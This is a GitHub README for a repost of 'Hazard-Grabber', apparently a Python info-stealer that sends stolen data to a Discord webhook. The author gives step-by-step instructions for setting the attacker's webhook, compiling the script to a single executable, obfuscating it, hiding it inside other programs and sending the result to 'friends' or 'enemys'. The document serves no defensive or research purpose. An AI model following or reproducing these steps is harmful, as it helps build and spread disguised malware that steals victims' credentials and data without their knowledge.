Hello! I'm pretty new on Github! Some days ago I found my old Hazard-Grabber directory and a repost with some changes from someone else. Enjoy this small repost with a hopefully easy tutorial.


As I said - I'm new üëã, but I will try my best ‚ô°
And yes, if you wanna call me that, you can call me a skid. That is the only thing I can do at the moment, but I'm trying to create my own projects. 


I'm learning coding at the moment to create my own projects as I mentioned before, but I'm pretty young and broke, so please don't hate me for copying/posting this stuff :)


### You would make me really happy if you ‚≠ê this repository if you like it!

### üíâ **Installation and use**

</div>


- [x] Step 1: Install python and make sure to add it to PATH.


- _Step 1 help > You don't know how you can add Python to PATH? No problem._ [This may help you!](https://medium.com/@omoshalewa/why-you-should-add-python-to-path-and-how-58693c17c443)

- [x] Step 2: Download the source code. (You can do this by simply clicking on the green/blue "Code" button and then the "Downlaod ZIP" button.) After that you should extract the file you just downloaded. Now you have to open a file called "hazard-v3.py" with any code editor. 


- _Step 2 help > I would recommend you Visual Studio Code._ [You can download it here!](https://code.visualstudio.com/)

- [x] Step 3: Open a command prompt in the directory and run the following command: "pip install -r requirements.txt".


- _Step 3 help > If you don't know how to open a command prompt in the directory,_ [here is a simple tutorial!](https://www.lifewire.com/open-command-prompt-in-a-folder-5185505)

- [x] Step 4: Just put your webhook in line 29 where the code says "WEBHOOK_HERE". Simply replace the webhook here with your webhook. 


- _Step 4 help > You need help with creating a webhook?_ [This will help you!](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks)

- [x] Step 5: (optional) You can also change the settings from line 30 to 37. True is enabling the setting, false is disbaling a setting. Easy!

- [x] Step 6: How do I compile this shit now? That's pretty easy! Just run this command after you opened a command prompt in the Hazard-Grabber Directory and run this command: "pyinstaller hazard.py --onefile". Now wait for it to compile the file. It was mainly made as a hidden script that can be implemented to programs, so you can skip this step if you want and just obfuscate the file. I would recommend you [Blanks Obfuscator](https://github.com/Blank-c/BlankOBF) or [addidix Obfuscator](https://github.com/addi00000/pycloak).

- [x] Step 7: (optional) Change the Icon. I don't know good programs for this at the moment. I will try to add this soon. If you know how to do this, let me know under the "Issues" ‚û§‚û§  "Suggestions" Tab.

- [x] Step 8: Send the created .exe to your friends to troll them or grab your enemys!!
